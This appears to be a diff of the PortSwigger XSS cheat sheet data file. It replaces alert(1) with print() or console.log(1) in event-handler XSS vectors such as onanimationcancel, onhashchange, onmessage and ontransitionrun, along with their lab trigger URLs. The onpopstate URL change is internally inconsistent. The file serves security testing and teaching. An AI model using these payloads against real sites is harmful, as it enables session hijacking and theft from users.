@@ -302,12 +302,12 @@
         "tags": [
             {
                 "tag": "*",
-                "code": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><* id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/*>",
+                "code": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><* id=x style=\"position:absolute;\" onanimationcancel=\"print()\"><\/*>",
                 "browsers": [
                     "firefox"
                 ],
                 "interaction": false,
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23%27%2C%27%23x%27%29%7D%2C500%29%3BsetTimeout%28x%3D%3Ethat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23%27%29%2C1000%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3C*%20id%3Dx%20style%3Dposition%3Aabsolute%3B%20onanimationcancel%3Dalert%281%29%3Etest%3C%2F*%3E%23%22%3E"
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23%27%2C%27%23x%27%29%7D%2C500%29%3BsetTimeout%28x%3D%3Ethat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23%27%29%2C1000%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3C*%20id%3Dx%20style%3Dposition%3Aabsolute%3B%20onanimationcancel%3Dprint%28%29%3Etest%3C%2F*%3E%23%22%3E"
             }
         ]
     },
@@ -3516,13 +3516,13 @@
         "tags": [
             {
                 "tag": "*",
-                "code": "<* id=x tabindex=1 onbeforedeactivate=alert(1)><\/*><input autofocus>",
+                "code": "<* id=x tabindex=1 onbeforedeactivate=print()><\/*><input autofocus>",
                 "browsers": [
                     "edge"
                 ],
                 "interaction": false,
                 "hash": "#x",
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23y%27%29%7D%2C500%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3C*%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C%2F*%3E%3Cinput%20id%3Dy%20autofocus%3E%23x%22%3E"
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23y%27%29%7D%2C500%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3C*%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dprint%28%29%3E%3C%2F*%3E%3Cinput%20id%3Dy%20autofocus%3E%23x%22%3E"
             }
         ]
     },
@@ -4665,8 +4665,8 @@
         "tags": [
             {
                 "tag": "body",
-                "code": "<body onbeforeprint=alert(1)>",
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22print%28%29%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onbeforeprint%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E",
+                "code": "<body onbeforeprint=console.log(1)>",
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22print%28%29%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onbeforeprint%3Dconsole.log%281%29%3E%22%3E%3C%2Fiframe%3E",
                 "browsers": [
                     "chrome",
                     "firefox",
@@ -6482,13 +6482,13 @@
         "tags": [
             {
                 "tag": "*",
-                "code": "<* id=x tabindex=1 ondeactivate=alert(1)><\/*><input id=y autofocus>",
+                "code": "<* id=x tabindex=1 ondeactivate=print()><\/*><input id=y autofocus>",
                 "browsers": [
                     "edge"
                 ],
                 "interaction": false,
                 "hash": "#x",
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23y%27%29%7D%2C500%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3C*%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dalert%281%29%3E%3C%2F*%3E%3Cinput%20id%3Dy%20autofocus%3E%23x%22%3E"
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23y%27%29%7D%2C500%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3C*%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dprint%28%29%3E%3C%2F*%3E%3Cinput%20id%3Dy%20autofocus%3E%23x%22%3E"
             }
         ]
     },
@@ -11697,8 +11697,8 @@
         "tags": [
             {
                 "tag": "body",
-                "code": "<body onhashchange=\"alert(1)\">",
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22if%28%21window.flag%29%7Bthis.contentWindow.location%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onhashchange%3Dalert%281%29%3E%23%27%3Bflag%3D1%7D%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onhashchange%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E",
+                "code": "<body onhashchange=\"print()\">",
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22if%28%21window.flag%29%7Bthis.contentWindow.location%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onhashchange%3Dprint%28%29%3E%23%27%3Bflag%3D1%7D%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onhashchange%3Dprint%28%29%3E%22%3E%3C%2Fiframe%3E",
                 "browsers": [
                     "chrome",
                     "firefox",
@@ -12161,8 +12161,8 @@
         "tags": [
             {
                 "tag": "body",
-                "code": "<body onmessage=alert(1)>",
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22this.contentWindow.postMessage%28%27%27%2C%27%2A%27%29%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onmessage%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E",
+                "code": "<body onmessage=print()>",
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22this.contentWindow.postMessage%28%27%27%2C%27%2A%27%29%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onmessage%3Dprint%28%29%3E%22%3E%3C%2Fiframe%3E",
                 "browsers": [
                     "chrome",
                     "firefox",
@@ -14081,8 +14081,8 @@
         "tags": [
             {
                 "tag": "body",
-                "code": "<body onpopstate=alert(1)>",
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22if%28%21window.flag%29%7Bthis.contentWindow.location%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onpopstate%3Dalert%281%29%3E%23%27%3Bflag%3D1%7D%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onpopstate%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E",
+                "code": "<body onpopstate=print()>",
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22if%28%21window.flag%29%7Bthis.contentWindow.location%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onpopstate%3Dalert%281%29%3E%23%27%3Bflag%3D1%7D%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onpopstate%3Dprint%281%29%3E%22%3E%3C%2Fiframe%3E",
                 "browsers": [
                     "chrome",
                     "firefox",
@@ -14212,8 +14212,8 @@
         "tags": [
             {
                 "tag": "body",
-                "code": "<body onresize=\"alert(1)\">",
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22this.style.width%3D%271000px%27%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onresize%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E",
+                "code": "<body onresize=\"print()\">",
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22this.style.width%3D%271000px%27%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onresize%3Dprint%28%29%3E%22%3E%3C%2Fiframe%3E",
                 "browsers": [
                     "chrome",
                     "firefox",
@@ -14462,12 +14462,12 @@
         "tags": [
             {
                 "tag": "*",
-                "code": "<style>:target {color: red;}<\/style><* id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/*>",
+                "code": "<style>:target {color: red;}<\/style><* id=x style=\"transition:color 10s\" ontransitioncancel=print()><\/*>",
                 "browsers": [
                     "firefox"
                 ],
                 "interaction": false,
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23%27%2C%27%23x%27%29%7D%2C500%29%3BsetTimeout%28x%3D%3Ethat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23%27%29%2C1000%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%3Atarget%20%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3C*%20id%3Dx%20style%3D%2522transition%3Acolor%2010s%2522%20ontransitioncancel%3Dalert%281%29%3Etest%3C%2F*%3E%23%22%3E"
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23%27%2C%27%23x%27%29%7D%2C500%29%3BsetTimeout%28x%3D%3Ethat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23%27%29%2C1000%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%3Atarget%20%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3C*%20id%3Dx%20style%3D%2522transition%3Acolor%2010s%2522%20ontransitioncancel%3Dprint%28%29%3Etest%3C%2F*%3E%23%22%3E"
             }
         ]
     },
@@ -14504,12 +14504,12 @@
         "tags": [
             {
                 "tag": "*",
-                "code": "<style>:target {transform: rotate(180deg);}<\/style><* id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/*>",
+                "code": "<style>:target {transform: rotate(180deg);}<\/style><* id=x style=\"transition:transform 2s\" ontransitionrun=print()><\/*>",
                 "browsers": [
                     "firefox"
                 ],
                 "interaction": false,
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22src%3Dsrc%2B%27%23x%27%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3C*%20id%3Dx%20style%3D%2522transition%3Atransform%202s%2522%20ontransitionrun%3Dalert%281%29%3E%3C%2F*%3E%22%3E"
+                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22src%3Dsrc%2B%27%23x%27%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3C*%20id%3Dx%20style%3D%2522transition%3Atransform%202s%2522%20ontransitionrun%3Dprint%28%29%3E%3C%2F*%3E%22%3E"
             }
         ]
     },
